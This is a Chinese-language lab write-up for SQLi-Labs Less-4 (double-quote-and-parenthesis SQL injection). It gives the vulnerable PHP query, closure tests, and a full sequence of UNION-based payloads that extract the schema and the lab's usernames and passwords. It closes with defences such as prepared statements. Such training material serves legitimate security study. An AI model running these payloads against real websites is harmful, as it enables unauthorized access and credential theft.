# SQLi-Labs Less-4 双引号括号注入 通关笔记

> 前四关是同一个模板，只是"外壳"不同。
>
> **Less-4 的外壳是：双引号 + 括号。**
>
> 它有个很坑的特点：**单引号不报错。**

---

## 一、这题在干什么

| 项目 | 内容 |
| --- | --- |
| 靶场 | SQLi-Labs |
| 关卡 | Less-4 (Error Based - Double Quotes) |
| 地址 | `http://localhost/sqli-labs/Less-4/` |
| 参数 | `id`（GET） |
| 类型 | 字符型 + **双引号** + **括号** |
| 目标 | 读出 `security.users` 表的账号密码 |

---

## 二、后台代码

```php
$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
```

**分两步看：**

1. 先用 `"` 把输入包起来
2. 再放进括号里

**最终拼成的 SQL：**

```sql
SELECT * FROM users WHERE id=("$id") LIMIT 0,1
                          ↑  ↑  ↑
                       括号 双引号 括号
```

---

## 三、判断闭合方式

### 3.1 四个测试

| 测试 | 结果 | 说明 |
| --- | --- | --- |
| `?id=1` | 正常，Dumb | 基础查询 |
| `?id=1'` | **正常，Dumb** | **单引号不报错！** |
| `?id=1"` | **报错** | 双引号才会破坏语法 |
| `?id=1") --+` | **正常** | 闭合成功 |

### 3.2 为什么单引号不报错

```sql
-- 输入 1'
WHERE id=("1'")
         └──┬──┘
         完整字符串 "1'"
```

**单引号落在双引号内部，只是字符串里的普通字符。**

然后 MySQL 做隐式类型转换：

```
"1'"  →  1
```

**`id` 是整数列，所以 `id=("1'")` 等价于 `id=1`，照常返回 Dumb。**

### 3.3 为什么双引号会报错

```sql
-- 输入 1"
WHERE id=("1"")
          ↑↑
      两个双引号撞了
```

**值区被提前关闭，后面又多出一个 `"`，语法错误。**

### 3.4 判断结论

| 现象 | 结论 |
| --- | --- |
| 单引号报错 | 后台用单引号 |
| **双引号报错** | **后台用双引号** |
| `") --+` 恢复 | 外壳是 `("$id")` |

**这一关的关键：别看单引号，要看双引号。**

---

## 四、我的解题步骤

### 步骤 1：正常查询

```
http://localhost/sqli-labs/Less-4/?id=1
```

返回 `Dumb / Dumb`。

### 步骤 2：判断闭合

```
?id=1'          → 正常（不报错！）
?id=1"          → 报错
?id=1") --+     → 正常
```

**判定：外壳是 `("$id")`，闭合符 `")`。**

### 步骤 3：数几列

```
?id=1") order by 3 --+   → 正常
?id=1") order by 4 --+   → 报错
```

**3 列。**

### 步骤 4：找回显位

```
?id=-1") union select 1,2,3 --+
```

实测返回：

```
Your Login name:2
Your Password:3
```

### 步骤 5：爆库名

```
?id=-1") union select 1,database(),version() --+
```

实测返回：

```
Your Login name:security
Your Password:5.7.26
```

### 步骤 6：爆表名

```
?id=-1") union select 1,group_concat(table_name),3
from information_schema.tables where table_schema=database() --+
```

实测返回：

```
Your Login name:emails,referers,uagents,users
Your Password:3
```

### 步骤 7：爆字段名

```
?id=-1") union select 1,group_concat(column_name),3
from information_schema.columns where table_name='users' and table_schema=database() --+
```

实测返回：

```
Your Login name:id,username,password
```

### 步骤 8：取数据

```
?id=-1") union select 1,group_concat(username,0x3a,password),3 from users --+
```

实测返回：

```
Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,
secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,
admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,
dhakkan:dumbo,admin4:admin4
```

**14 条，和前几关完全一样。**

---

## 五、原理分析

### 5.1 闭合要"配对全部外壳"

```sql
WHERE id=("1") --+ ") LIMIT 0,1
         └┬┘└┬┘└──────┬──────┘
        双引号 括号     注释
```

**三个东西：双引号、括号、注释。少一个都闭合不了。**

### 5.2 为什么 `--+` 在这里也必须

```sql
-- 不加注释
WHERE id=("1") ") LIMIT 0,1
              ↑
        后面还有个 ")

-- 加了注释
WHERE id=("1") --+ ") LIMIT 0,1
```

**注释掉残留的壳，语法才干净。**

### 5.3 隐式类型转换的连锁反应

这一关有两个地方被类型转换"救"了：

| 输入 | 字符串 | 转成数字 |
| --- | --- | --- |
| `1'` | `"1'"` | `1` → 查到 Dumb |
| `1"` | — | 语法错误，转换救不了 |

**第一次转换让你误以为"单引号没被过滤"**——其实是它压根没起作用。

### 5.4 为什么要试四种符号

| 符号 | 会破坏什么 |
| --- | --- |
| `'` | 单引号包裹 |
| `"` | 双引号包裹 |
| `)` | 括号 |
| `'` + `)` | 单引号 + 括号 |
| `"` + `)` | 双引号 + 括号 |

**后台可能用其中任意一种，所以要逐个试。**

---

## 六、四关全面对比

### 6.1 核心差异

| | Less-1 | Less-2 | Less-3 | Less-4 |
| --- | --- | --- | --- | --- |
| 类型 | 字符型 | 数字型 | 字符型+括号 | 字符型+双引号+括号 |
| 后台写法 | `id='$id'` | `id=$id` | `id=('$id')` | `id=("$id")` |
| 闭合符 | `'` | 无 | `')` | `")` |
| **单引号会报错吗** | ✅ 会 | ✅ 会 | ✅ 会 | ❌ **不会** |
| 关键判断 | `' --+` 恢复 | `--+` 单独正常 | `') --+` 恢复 | **`"` 报错** |

### 6.2 payload 对照

| 步骤 | L1 | L2 | L3 | L4 |
| --- | --- | --- | --- | --- |
| 判断 | `?id=1'` | `?id=1'` | `?id=1'` | `?id=1"` |
| 恢复 | `1' --+` | `1 --+` | `1') --+` | `1") --+` |
| 显位 | `-1' union select 1,2,3 --+` | `-1 union select 1,2,3 --+` | `-1') union...` | `-1") union...` |
| 后续 | 完全相同 | 相同 | 相同 | 相同 |

### 6.3 一句话记住四关

| 关卡 | 后台 | 闭合 |
| --- | --- | --- |
| L1 | `id='$id'` | `'` |
| L2 | `id=$id` | 无 |
| L3 | `id=('$id')` | `')` |
| L4 | `id=("$id")` | `")` |

**规律：后台用什么把输入包住，你就用什么把它打开。**

### 6.4 结果对照

| 关卡 | 库 | 表 | 字段 | 条数 |
| --- | --- | --- | --- | --- |
| L1 | security | users | id,username,password | 14 |
| L2 | security | users | 同上 | 14 |
| L3 | security | users | 同上 | 14 |
| L4 | security | users | 同上 | 14 |

**四关查的是同一个库，所以数据完全一样。**

---

## 七、知识点与笔记

### 7.1 闭合速查表

| 后台写法 | 闭合 |
| --- | --- |
| `id=$id` | 无 |
| `id='$id'` | `'` |
| `id="$id"` | `"` |
| `id=($id)` | `)` |
| `id=('$id')` | `')` |
| `id=("$id")` | `")` |
| `id=('$id')` 且 `addslashes` | 宽字节（`%df'`） |

### 7.2 判断流程（四关通用）

```
输入单引号 '
   ├─ 报错
   │    ├─ ' --+ 恢复        → L1（只有单引号）
   │    ├─ ') --+ 恢复       → L3（单引号+括号）
   │    └─ 都不恢复，但 --+ 单独正常 → L2（数字型）
   │
   └─ 不报错
        ├─ 双引号 " 报错     → L4（双引号+括号）
        └─ 双引号也不报错    → 可能有过滤或用其它符号
```

### 7.3 为什么单引号在 L4 不报错

```sql
WHERE id=("1'")
```

**单引号在双引号内部 = 普通字符。**

**必须用双引号才能"关掉"这个字符串。**

### 7.4 隐式类型转换的坑

| 字符串 | 转成数字 |
| --- | --- |
| `"1'"` | `1` |
| `"1abc"` | `1` |
| `"1) -- "` | `1` |
| `"-1 union..."` | `-1` |

**规则：从左往右取数字，遇到非数字停止。**

**后果：**

- 可能"意外查到数据"，让你误判闭合
- 也可能"整段 payload 被吞"，注入不成立

### 7.5 常用函数

| 函数 | 作用 |
| --- | --- |
| `database()` | 当前库 |
| `version()` | 版本 |
| `group_concat()` | 多行拼一行 |
| `information_schema.tables` | 表清单 |
| `information_schema.columns` | 字段清单 |

---

## 八、防御怎么写

### 8.1 双引号不是防护

```php
// 依然可注入
$id = '"' . $id . '"';
$sql = "SELECT * FROM users WHERE id=($id) LIMIT 0,1";
```

**换引号类型只是让攻击者多试一次。**

### 8.2 括号不是防护

```php
$sql = "SELECT * FROM users WHERE id=('$id')";
```

**括号同样只是外壳。**

### 8.3 根本解：预编译

```php
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id=? LIMIT 0,1");
$stmt->bind_param('i', $id);
$stmt->execute();
```

**`?` 占位符会把输入当纯数据。**

### 8.4 类型转换

```php
$id = intval($_GET['id']);
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

**`intval("1\") union ...")` 会变成 `1`。**

### 8.5 三层防御

| 层 | 做法 |
| --- | --- |
| 代码层 | 预编译 / 类型转换 |
| 数据库层 | 最小权限、关闭报错 |
| 运维层 | WAF、审计 |

---

## 九、总结

### 九步流程（四关通用）

| 步骤 | 内容 |
| --- | --- |
| 1 | 判断闭合（**唯一不同的地方**） |
| 2 | `order by` 数列 |
| 3 | `union` 找显位 |
| 4 | `database()` |
| 5 | `information_schema.tables` |
| 6 | `information_schema.columns` |
| 7 | `from users` 取数据 |

### 一句话

> **Less-4 相比 Less-1，只是把单引号换成了双引号。**
>
> **但它的坑在于：单引号不报错，必须用双引号才能判断出来。**

### 四关一起记

| 关卡 | 后台 | 闭合 | 判断信号 |
| --- | --- | --- | --- |
| Less-1 | `id='$id'` | `'` | `' --+` 恢复 |
| Less-2 | `id=$id` | 无 | `--+` 单独正常 |
| Less-3 | `id=('$id')` | `')` | `') --+` 恢复 |
| Less-4 | `id=("$id")` | `")` | **`"` 报错** |

**这四关走完，闭合判断就没有陌生情况了。**

---

## 参考

- [sqli-labs GitHub](https://github.com/Audi-1/sqli-labs)
- [sqli-labs php7 兼容版](https://github.com/happygongzhuo/sqli-labs-php7)
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
